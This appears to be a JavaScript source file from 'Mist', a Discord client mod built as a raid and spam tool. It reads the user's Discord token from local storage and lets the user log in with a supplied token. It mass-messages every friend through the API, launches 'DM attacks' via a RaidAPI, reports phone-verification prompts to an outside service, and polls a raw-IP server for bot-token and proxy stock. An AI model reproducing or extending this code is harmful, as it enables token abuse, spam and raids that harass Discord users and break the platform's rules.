        var snowflakes = window.MistUtils.InjectHTML(`<div class="snowflakes" aria-hidden="true"><div class="snowflake">❅</div><div class="snowflake">❅</div><div class="snowflake">❆</div><div class="snowflake">❄</div><div class="snowflake">❅</div><div class="snowflake">❆</div><div class="snowflake">❄</div><div class="snowflake">❅</div><div class="snowflake">❆</div><div class="snowflake">❄</div></div>`)

        document.body.appendChild(snowflakes);

        var audio = window.MistUtils.InjectHTML(`<audio autoplay><source src="${audioURL}" type="audio/mpeg"></audio>`);

        document.body.appendChild(audio);
        EasterEggs++;
   });
}
window.addConsoleButton = function (element)
{
    //<div tabindex="0" class="item-3HpYcP item-PXvHYJ themed-OHr7kt" aria-label="Pending" role="button" id="ShowConsoleButton">Console</div>
    var button = window.MistUtils.InjectHTML(`<div tabindex="0" class="item-3HpYcP item-PXvHYJ themed-OHr7kt" aria-label="Console" role="button" id="ShowConsoleButton">Mist</div>`);

    element.appendChild(button);

    var consoleButtonItself = document.getElementById('ShowConsoleButton');

    consoleButtonItself.addEventListener("click", () => {
        consoleButtonItself.className = "item-3HpYcP item-PXvHYJ selected-3s45Ha themed-OHr7kt";

        var Remove = document.getElementsByClassName("peopleColumn-29fq28");
        document.getElementsByClassName("nowPlayingColumn-2sl4cE")[0].remove();
        document.getElementsByClassName("tabBody-3YRQ8W")[0].remove();
        if (Remove.length > 0)
        {
            Remove[0].remove();

            var content = document.getElementsByClassName("container-1D34oG")[0];

            var addMegaHolster = window.MistUtils.InjectHTML(`<div class="peopleColumn-29fq28"><div class="friendsTableHeader-32yE7d"><header class="friendsColumn-eVHFqJ friendsColumnName-1zBOKm container-2ax-kl">Name</header><header class="friendsColumn-eVHFqJ friendsColumnStatus-ZH4ho2 container-2ax-kl">Status</header><header class="friendsColumn-eVHFqJ friendsColumnGuilds-2we6jb container-2ax-kl">Mutual Servers</header><div class="friendsColumn-eVHFqJ friendsColumnGuilds-2we6jb container-2ax-kl" id="StatsModeText">Easter-egg Counter: ${EasterEggs}</div></div><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix scrollerThemed-2oenus themedWithTrack-q8E3vB"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl friendsTableBody-1ZhKif"><div><div class="friendsEmpty-1KQXin" style="opacity: 1;"><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6 wrapper-r-6rrt" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" direction="vertical-V37hAW flex-1O1GKY directionColumn-35P_nr" style="flex: 0 1 auto;"><div class="text-GwUZgS marginTop8-1DLZ1n" id='OutputText'>Choose your poison</div></div></div></div></div></div></div></div>`);
            content.appendChild(addMegaHolster);

            var element = document.getElementsByClassName("flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6 wrapper-r-6rrt")[0];

            window.addConsoleCommand(element, "Server Status", "Get information on Mist's servers", () => {
                request.get(`http://35.239.222.228:1337/stats`, (err, res, body) => {
                    
                    var output = document.getElementById('OutputText');
                    if (body == undefined)
                    {
                        output.innerHTML = "Server didn't respond! Perhaps you supplied an invalid API Key or the server is down?<br />";
                    }
                    else{
                        var jsonparsed = JSON.parse(body);
                        
                        output.innerHTML = `MIST SERVER STATUS<br />Status Code: ${jsonparsed.code}<br />Time Since Restart: ${jsonparsed.timesincerestart}<br />Bot Stock: ${jsonparsed.tokens}<br />Proxy Stock: ${jsonparsed.proxycount}<br />Sent Requests: ${jsonparsed.messages_sent}<br />`;
                    }
                });
            });

            window.addConsoleCommand(element, "Credits", "List a bunch of credits of who made mist", () => {

                var output = document.getElementById('OutputText');

                output.innerHTML = "Saiy (C#/C++/JS/HTML/CSS) - Developer<br />Yaekith (C#/C++/NodeJS/HTML) - Developer<br />";
            });

            window.addConsoleCommand(element, "Changelog", "View the recent updates and additions to mist!", () => {
                //<div class="card-GqTca8 interactive-IxbS32 card-3EIh8J outer-2IVh5n interactive-1BeKSi"><div class="wrapper-Qvfyci" style="padding-bottom: 46.7391%;"><div class="imageWrapper-2p5ogY image-3g0L65" style="width: 460px; height: 215px;"><img class="image-3g0L65" alt="" src="https://i.imgur.com/kbLrdvm.png" style="width: 460px; height: 215px;"></div><div class="content-18wcsC"><button type="button" class="button-38aScr lookFilled-1Gx00P buttonColor-1agP3J sizeSmall-2cSMqn shareButton-3w0M74 grow-q77ONN" id="MistUpdateShareButton"><div class="contents-18-Yxp">Share</div></button></div></div><div class="content-2mFvgT"><h3 class="title-pqKcDf contentBottomMargin-1tmEca base-1x0h_U size16-1P40sf" id="MistUpdateTitle">Mist Update to 3.4!</h3><div class="colorStandard-2KCXvj size14-e6ZScH description-2vtOHd contentBottomMargin-1tmEca" id="MistUpdateDescription">Howdy Folks! It is finally time. That’s right, we finally updated mist again! Christmas is coming soon so please be expecting some more updates, with love by The Mist Team.</div></div><div class="wrapper-9ppXpy"><div class="colorMuted-HdFt4q size12-3cLvbJ content-2CuwYo">Recently <span class="timestamp-2Xe6Co">yaekiths-projects.xyz</span></div><div tabindex="0" class="iconWrapper-3-slmh interactive-1FxC7B" role="button"><img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/1a9a4862-df68-40bf-8628-7cb3dfe0103c/dd6kejv-3cd2eb4e-7d3d-47c9-8e98-fba229216e88.png/v1/fill/w_400,h_400,strp/wumpus_by_inklessrambles_dd6kejv-fullview.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NDAwIiwicGF0aCI6IlwvZlwvMWE5YTQ4NjItZGY2OC00MGJmLTg2MjgtN2NiM2RmZTAxMDNjXC9kZDZrZWp2LTNjZDJlYjRlLTdkM2QtNDdjOS04ZTk4LWZiYTIyOTIxNmU4OC5wbmciLCJ3aWR0aCI6Ijw9NDAwIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmltYWdlLm9wZXJhdGlvbnMiXX0.TWqMtMWoISoaJlVtlLr_tE5mP17YDrOqo13uHlEF6OQ" class="icon-1EDgZt" alt="Hot Dogs, Horseshoes &amp; Hand Grenades"></div></div></div>

                var output = document.getElementById('OutputText');

                output.innerHTML = `<div class="card-GqTca8 interactive-IxbS32 card-3EIh8J outer-2IVh5n interactive-1BeKSi"><div class="wrapper-Qvfyci" style="padding-bottom: 46.7391%;"><div class="imageWrapper-2p5ogY image-3g0L65" style="width: 460px; height: 215px;"><img class="image-3g0L65" alt="" src="https://i.imgur.com/kbLrdvm.png" style="left: 0px;"></div><div class="content-18wcsC"><button type="button" class="button-38aScr lookFilled-1Gx00P buttonColor-1agP3J sizeSmall-2cSMqn shareButton-3w0M74 grow-q77ONN" id="MistUpdateShareButton"><div class="contents-18-Yxp">Share</div></button></div></div><div class="content-2mFvgT"><h3 class="title-pqKcDf contentBottomMargin-1tmEca base-1x0h_U size16-1P40sf" id="MistUpdateTitle">Mist Update to 3.4!</h3><div class="colorStandard-2KCXvj size14-e6ZScH description-2vtOHd contentBottomMargin-1tmEca" id="MistUpdateDescription">Howdy Folks! It is finally time. That’s right, we finally updated mist again! Christmas is coming soon so please be expecting some more updates, with love by The Mist Team.</div></div><div class="wrapper-9ppXpy"><div class="colorMuted-HdFt4q size12-3cLvbJ content-2CuwYo">Recently <span class="timestamp-2Xe6Co">yaekiths-projects.xyz</span></div><div tabindex="0" class="iconWrapper-3-slmh interactive-1FxC7B" role="button"><img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/1a9a4862-df68-40bf-8628-7cb3dfe0103c/dd6kejv-3cd2eb4e-7d3d-47c9-8e98-fba229216e88.png/v1/fill/w_400,h_400,strp/wumpus_by_inklessrambles_dd6kejv-fullview.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NDAwIiwicGF0aCI6IlwvZlwvMWE5YTQ4NjItZGY2OC00MGJmLTg2MjgtN2NiM2RmZTAxMDNjXC9kZDZrZWp2LTNjZDJlYjRlLTdkM2QtNDdjOS04ZTk4LWZiYTIyOTIxNmU4OC5wbmciLCJ3aWR0aCI6Ijw9NDAwIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmltYWdlLm9wZXJhdGlvbnMiXX0.TWqMtMWoISoaJlVtlLr_tE5mP17YDrOqo13uHlEF6OQ" class="icon-1EDgZt" alt="Mist Update"></div></div></div>`

                var MistUpdateDescription = document.getElementById('MistUpdateDescription');

                MistUpdateDescription.addEventListener("click", () => {
                    window.DrawingAPI.alert('Mist Update to 3.5', 'Howdy Folks! It is finally time. That’s right, we finally updated mist again! Christmas is coming soon so please be expecting some more updates, with love by The Mist Team.');
                });
            });
        }
    });
}
window.addConsoleCommand = function(element, CommandHeader, CommandDescription, callback)
{
    //CommandDescription = description
    //
    var CommandHolster = window.MistUtils.InjectHTML(`<div class="webhookRow-20TsIQ marginBottom8-AtZOdT cardPrimaryEditable-3KtE4g card-3Qj_Yx"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 0 1 auto;"></div><div class="flex-1xMQg5 flex-1O1GKY vertical-V37hAW flex-1O1GKY directionColumn-35P_nr justifyCenter-3D2jYp alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 1 1 auto;"><h3 class="h3-3PDeKG title-3sZWYQ defaultColor-1_ajX0 marginReset-236NPn" id="CommandHeader">${CommandHeader}</h3><div class="description-3_Ncsb formText-3fs7AJ modeDefault-3a2Ph1 primary-jw0I4K">${CommandDescription}</div></div><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6" style="flex: 0 1 auto;"><button type="button" class="button-38aScr lookOutlined-3sRXeN colorWhite-rEQuAQ sizeSmall-2cSMqn grow-q77ONN" id="ExecuteCommand-${CommandHeader}"><div class="contents-18-Yxp">Execute</div></button></div></div><div tabindex="0" aria-label="Remove" class="button-2CgfFz removeWebhook-3PNViU" role="button"></div></div>`)

    element.appendChild(CommandHolster);

    var commandButton = document.getElementById('ExecuteCommand-' + CommandHeader);

    commandButton.addEventListener("click", () => {
        callback();
    });
}
function CheckIfVerificationNeeded(){
    if (document.getElementsByClassName('flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6 verificationBlock-1Chfpc')[0] !== undefined)
    {
        if (document.getElementsByClassName('image-2LVZ_j phone-27MBJz').length > 0)
        {
                window.RaidAPI.signalMistrix(window.getUserToken(), "phoneVerification");
                
        }
    }
}
function DenyFriendRequest(userid)
{
    setTimeout(() => {
        request.delete(`https://discordapp.com/api/v6/users/@me/relationships/${userid}`, {
            headers: {
                'Authorization' : window.getUserToken()
            }
        }, (err, res, body) => {
        
        });
    }, 1000);
}
window.TextValue = "";

function SendDMAttack(discordinv, discordid, message)
{
    window.RaidAPI.CallUserAttack(window.ParseInvite(discordinv), discordid, message);
}
function SendM2AF(msg){
    request.get('https://discordapp.com/api/v6/users/@me/relationships', {
        headers: {
            'Authorization' : window.getUserToken()
        }
    }, (err, res, body) => {
        var json = JSON.parse(body);
            for(var i = 0; i < json.length; i++)
            {
                if (json[i].type == 1)
                {
                var user = json[i].user.id;
                sendDmMessage(user, msg);
                }
            }
    });
}
function sendDmMessage(user, text)
{
    setTimeout(() => {


        request.post('https://discordapp.com/api/v6/users/@me/channels', {
            headers: {
                'Authorization' : window.getUserToken(),
                'Content-Type' : 'application/json'
            },
            body: `{"recipients":["${user}"]}`,
        }, (err, res, body) => {
            var json = JSON.parse(body);
            var id = json.id;

            request.post(`https://discordapp.com/api/v6/channels/${id}/messages`, {
                headers: {
                    'Authorization' : window.getUserToken()
                },
                json: true,
                body: {
                    'content' : text,
                    'nonce' : null,
                    'tts': false
                }
            }, (Err, res, body) => {
            });
        });


    },600)
     
}
window.ParseInvite = function ParseInvite(invite)
{
        if (invite.startsWith("https://www.discord.gg/")) invite = invite.replace("https://www.discord.gg/", "");
        else if (invite.startsWith("https://discord.gg/")) invite = invite.replace("https://discord.gg/", "");
        else if (invite.startsWith("www.discord.gg/")) invite = invite.replace("www.discord.gg/", "");
        else if (invite.startsWith("discord.gg/")) invite = invite.replace("discord.gg/", "");
        else if (invite.startsWith("https://www.discordapp.com/invite/")) invite = invite.replace("https://www.discordapp.com/invite/", "");
        else if (invite.startsWith("https://discordapp.com/invite/")) invite = invite.replace("https://discordapp.com/invite/", "");
        else if (invite.startsWith("www.discordapp.com/invite/")) invite = invite.replace("www.discordapp.com/invite/", "");
        else if (invite.startsWith("discordapp.com/invite/")) invite = invite.replace("discordapp.com/invite/", "");
        return invite;
}
window.ShowBox = function ShowTextBox(Title, Description, fieldText, callback, Summary = "Fun-Fact : Tada is super gay.", buttonText = "Go")
{
    var holster = document.getElementsByClassName('appMount-3lHmkl')[0];
    var random = Math.random();
    var elem = window.MistUtils.InjectHTML(`<div class="theme-dark" id="DeleteAll-${random}">
    <div class="backdrop-1wrmKB" style="opacity: 0.70; background-color: rgb(0, 0, 0); z-index: 1000; transform: translateZ(0px);"></div>
    <div class="modal-3c3bKg" style="opacity: 1; transform: scale(1) translateZ(0px);">
       <div data-focus-guard="true" tabindex="0" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div>
       <div data-focus-guard="true" tabindex="1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div>
       <div data-focus-lock-disabled="false" class="inner-1ilYF7">
          <div class="menu-Sp6bN1" style="    width: 600px; max-height: 800px; min-height: 200px; border-radius: 5px;
          display: -webkit-box;
          display: -ms-flexbox;
          display: flex;
          -webkit-box-flex: 1;
          -ms-flex: 1;
          flex: 1;
          -webkit-box-orient: vertical;
          -webkit-box-direction: normal;
          -ms-flex-direction: column;
          flex-direction: column;">
             <div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6 header-2tA9Os" style="flex: 0 0 auto;">
                <h3 class="wrapper-1sSZUt base-1x0h_U size20-17Iy80"><span class="label-1Y-LW5"><center>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${Title}</center></span></h3>
                <button aria-label="Close" type="button" id="CloseButtonText-${random}" class="close-1kwMUs closeIcon-3_iQ6l button-38aScr lookBlank-3eh9lL colorBrand-3pXr91 grow-q77ONN" style="position: absolute; left: 530px;">
                   <div class="contents-18-Yxp">
                      <svg name="Close" aria-hidden="false" width="18" height="18" viewBox="0 0 12 12">
                         <g fill="none" fill-rule="evenodd">
                            <path d="M0 0h12v12H0"></path>
                            <path class="fill" fill="currentColor" d="M9.5 3.205L8.795 2.5 6 5.295 3.205 2.5l-.705.705L5.295 6 2.5 8.795l.705.705L6 6.705 8.795 9.5l.705-.705L6.705 6"></path>
                         </g>
                      </svg>
                   </div>
                </button>
             </div>
             <div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix content-1EtbQh scrollerThemed-2oenus themeHidden-2yP93k">
                <div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl inner-ZyuQk0 content-2qfHzC">
                <div class="radioGroup-1GBvlr">
                   
  <form class="wrapper-1cBijl"><input class="addFriendInput-4bcerK" id="TextInputLol-${random}" placeholder="${fieldText}"><div class="addFriendHint-3Y70FX"></div><button type="button" class="button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeSmall-2cSMqn grow-q77ONN" id="NextButtonID-${random}"><div class="contents-18-Yxp">${buttonText}</div></button></form>
  <h1>${Summary}</h1>
                  
      </div>
             </div>
          </div>
          
       </div>
       
       <div data-focus-guard="true" tabindex="0" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div>
    </div>
 </div></div>`)

    holster.appendChild(elem);

    var NextButton = document.getElementById('NextButtonID-' + random);
    var input = document.getElementById('TextInputLol-' + random);

    NextButton.addEventListener("click", () => {
        window.TextValue = input.value;

        callback();

        this.document.getElementById(`DeleteAll-${random}`).remove();
    });

    var close = document.getElementById('CloseButtonText-' + random);

    close.addEventListener("click", () => {
        window.TextValue = "";
        this.document.getElementById(`DeleteAll-${random}`).remove();
    });

    return input.value;
}
function sleep(timems) {
    return new Promise(resolve => {
        setTimeout(resolve, timems);
    });
}
window.getUserToken = function(){
    var token = window.MC.localStorage.getItem('token').split('"');
    return token[1];
}
window.LoginWithToken = function(token) {
    window.MC.localStorage.setItem("token", '"' + token +'"');
    this.location.reload();
}
window.DrawingAPI = class MistDrawingAPI {
    static get React() { return this.findModuleByProps('createElement'); }
    static get ReactDOM() { return this.findModuleByProps('findDOMNode'); }

    static escapeID(id) {
        return id.replace(/^[^a-z]+|[^\w-]+/gi, "");
    }

    static injectCSS(id, css) {
        const style = document.createElement("style");
		style.id = this.escapeID(id);
		style.innerHTML = css;
		document.head.append(style);
    }

    static clearCSS(id) {
		const element = document.getElementById(this.escapeID(id));
		if (element) element.remove();
    }
    static linkJS(id, url) {
        return new Promise(resolve => {
			const script = document.createElement("script");
			script.id = this.escapeID(id);
			script.src = url;
			script.type = "text/javascript";
			script.onload = resolve;
			document.head.append(script);
		});
    }

    static unlinkJS(id) {
        const element = document.getElementById(this.escapeID(id));
		if (element) element.remove();
    }
    
    static alert(title, body) {
        const ModalStack = MistDrawingAPI.findModuleByProps("push", "update", "pop", "popWithKey");
        const AlertModal = MistDrawingAPI.findModule(m => m.prototype && m.prototype.handleCancel && m.prototype.handleSubmit && m.prototype.handleMinorConfirm);
        if (!ModalStack || !AlertModal) return window.alert(body);
        ModalStack.push(function(props) {
            return MistDrawingAPI.React.createElement(AlertModal, Object.assign({title, body}, props));
        });
    }
   
    static getInternalInstance(node) {
        if (!(node instanceof window.jQuery) && !(node instanceof Element)) return undefined;
        if (node instanceof window.jQuery) node = node[0];
        return node[Object.keys(node).find(k => k.startsWith("__reactInternalInstance"))];
    }

    static findModule(filter, silent = true) {
        for (let i in req.c) {
            if (req.c.hasOwnProperty(i)) {
                let m = req.c[i].exports;
                if (m && m.__esModule && m.default && filter(m.default)) return m.default;
                if (m && filter(m))	return m;
            }
        }
        return null;
    }

    static findAllModules(filter) {
        const modules = [];
        for (let i in req.c) {
            if (req.c.hasOwnProperty(i)) {
                let m = req.c[i].exports;
                if (m && m.__esModule && m.default && filter(m.default)) modules.push(m.default);
                else if (m && filter(m)) modules.push(m);
            }
        }
        return modules;
    }

    static findModuleByProps(...props) {
        return MistDrawingAPI.findModule(module => props.every(prop => module[prop] !== undefined));
    }

    static findModuleByDisplayName(name) {
        return MistDrawingAPI.findModule(module => module.displayName === name);
    }
    
    static NormalPatch(what, methodName, options) {
        const {before, after, instead, once = false, silent = false, force = false} = options;
        const displayName = options.displayName || what.displayName || what.name || what.constructor.displayName || what.constructor.name;
        if (!silent)
        if (!what[methodName]) {
            if (force) what[methodName] = function() {};
            else return console.error(methodName, "does not exist for", displayName);
        }
        const origMethod = what[methodName];
        const cancel = () => {
            if (!silent)
            what[methodName] = origMethod;
        };
        what[methodName] = function() {
            const data = {
                thisObject: this,
                methodArguments: arguments,
                cancelPatch: cancel,
                originalMethod: origMethod,
                callOriginalMethod: () => data.returnValue = data.originalMethod.apply(data.thisObject, data.methodArguments)
            };
            if (instead) {
                const tempRet = suppressErrors(instead, "`instead` callback of " + what[methodName].displayName)(data);
                if (tempRet !== undefined) data.returnValue = tempRet;
            }
            else {
                if (before) suppressErrors(before, "`before` callback of " + what[methodName].displayName)(data);
                data.callOriginalMethod();
                if (after) suppressErrors(after, "`after` callback of " + what[methodName].displayName)(data);
            }
            if (once) cancel();
            return data.returnValue;
        };
        what[methodName].__monkeyPatched = true;
        what[methodName].displayName = "patched " + (what[methodName].displayName || methodName);
        return cancel;
    }

    static suppressErrors(method, description) {
        return (...params) => {
            try { return method(...params);	}
            catch (e) { console.error("Error occurred in " + description, e); }
        };
    }

    static formatString(string, values) {
        for (let val in values) {
            string = string.replace(new RegExp(`\\{\\{${val}\\}\\}`, 'g'), values[val]);
        }
        return string;
    };
};
